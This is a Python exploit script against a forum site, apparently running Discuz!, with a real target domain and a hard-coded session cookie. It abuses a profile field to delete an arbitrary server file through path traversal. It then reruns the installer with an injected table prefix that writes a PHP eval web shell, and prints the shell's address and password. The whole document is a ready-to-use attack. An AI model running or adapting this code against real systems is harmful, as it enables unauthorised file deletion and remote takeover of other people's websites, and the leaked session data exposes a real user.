#!/usr/bin/env python3
import base64
import random
import re
import string

import requests

sess = requests.Session()
randstr = lambda len=5: ''.join(random.choice(string.ascii_lowercase) for _ in range(len))

##################################################
########## Customize these parameters ############
target = 'http://www.chinadsl.net'
# login target site first, and copy the cookie here
cookie = "pgv_pvi=6293225472; pgv_si=s7518214144; chinadsl_edbb_saltkey=o7qllsIJ; chinadsl_edbb_lastvisit=1599259323; chinadsl_edbb_con_request_uri=http%3A%2F%2Fwww.chinadsl.net%2Fconnect.php%3Fmod%3Dlogin%26op%3Dcallback%26referer%3Dindex.php; chinadsl_edbb_connect_qq_nick=%E8%80%81%E7%8E%8B%E9%9A%94%E5%A3%81%E7%9A%84%E8%80%81%E7%8E%8B; chinadsl_edbb_stats_qc_login=4; chinadsl_edbb_client_created=1599263006; chinadsl_edbb_client_token=1; chinadsl_edbb_connect_js_name=user_bind; chinadsl_edbb_connect_js_params=YToxOntzOjQ6InR5cGUiO3M6ODoicmVnaXN0ZXIiO30%3D; chinadsl_edbb_connect_login=1; chinadsl_edbb_connect_is_bind=1; chinadsl_edbb_connect_uin=73B411F3A4B30854529512502C264183; chinadsl_edbb_stats_qc_reg=1; chinadsl_edbb_ulastactivity=e605cTQfubTqcWI0B38ZyK7Lx0aKcNuzev%2BQyymJJSdCVj9tfbsu; chinadsl_edbb_auth=4e7b%2F3GQzlvP1ZZ3NCzZq5bLP8%2B4iswIY5dxBbi%2FFiPS%2FM4R7JodptOO%2B%2FS1W2azLnu7xKL0rGaS5BtP%2BwmVys5sKvU; chinadsl_edbb_sid=yE0uzA; chinadsl_edbb_lip=223.73.52.117%2C1599263006; chinadsl_edbb_home_diymode=1; chinadsl_edbb_home_readfeed=1599263112; chinadsl_edbb_lastact=1599263113%09misc.php%09patch"
shell_password = randstr()
db_host = ''
db_user = ''
db_pw = ''
db_name = ''
#################################################

path = '/home.php?mod=spacecp&ac=profile&op=base'
url = target + path

sess.headers.update({
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Referer': url})


# sess.proxies.update({'http': 'socks5://localhost:1080'})
# sess.proxies.update({'http': 'http://localhost:8080'})


def login(username=None, password=None):
    sess.headers.update({'Cookie': cookie})


def get_form_hash():
    r = sess.get(url)
    match = re.search(r'"member.php\?mod=logging&amp;action=logout&amp;formhash=(.*?)"', r.text, re.I)
    if match:
        return match.group(1)


def tamper(formhash, file_to_delete):
    data = {
        'formhash': (None, formhash),
        'profilesubmit': (None, 'true'),
        'birthprovince': (None, file_to_delete)
    }
    r = sess.post(url, files=data)
    if 'parent.show_success' in r.text:
        print('tamperred successfully')
        return True


def delete(formhash, file):
    if not tamper(formhash, file):
        return False

    image = b'iVBORw0KGgoAAAANSUhEUgAAAAoAAAAKCAIAAAACUFjqAAAADUlEQVR4nGNgGAWkAwABNgABVtF/yAAAAABJRU5ErkJggg=='
    data = {
        'formhash': formhash,
        'profilesubmit': 'true'
    }
    files = {
        'birthprovince': ('image.png', base64.b64decode(image), 'image/png')
    }
    r = sess.post(url, data=data, files=files)
    if 'parent.show_success' in r.text:
        print('delete {} successfully'.format(file))
        return True


def getshell():
    install_url = target + '/install/index.php'
    r = sess.get(install_url)
    if '安装向导' not in r.text:
        print('install directory not exists')
        return False
   
    table_prefix = "x');@eval($_POST[{}]);('".format(shell_password)
    data = {
        'step': 3,
        'install_ucenter': 'yes',
        'dbinfo[dbhost]': db_host,
        'dbinfo[dbname]': db_name,
        'dbinfo[dbuser]': db_user,
        'dbinfo[dbpw]': db_pw,
        'dbinfo[tablepre]': table_prefix,
        'dbinfo[adminemail]': 'admin@admin.com',
        'admininfo[username]': 'admin',
        'admininfo[password]': 'admin',
        'admininfo[password2]': 'admin',
        'admininfo[email]': 'admin@admin.com',
    }
    r = sess.post(install_url, data=data)
    if '建立数据表 CREATE TABLE' not in r.text:
        print('write shell failed')
        return False
    print('shell: {}/config/config_ucenter.php'.format(target))
    print('password: {}'.format(shell_password))


if __name__ == '__main__':
    login()
    form_hash = get_form_hash()
    if form_hash:
        delete(form_hash, '../../../../../../../../../../www/server/panel/data/admin_path.pl')
        getshell()
    else:
        print('failed')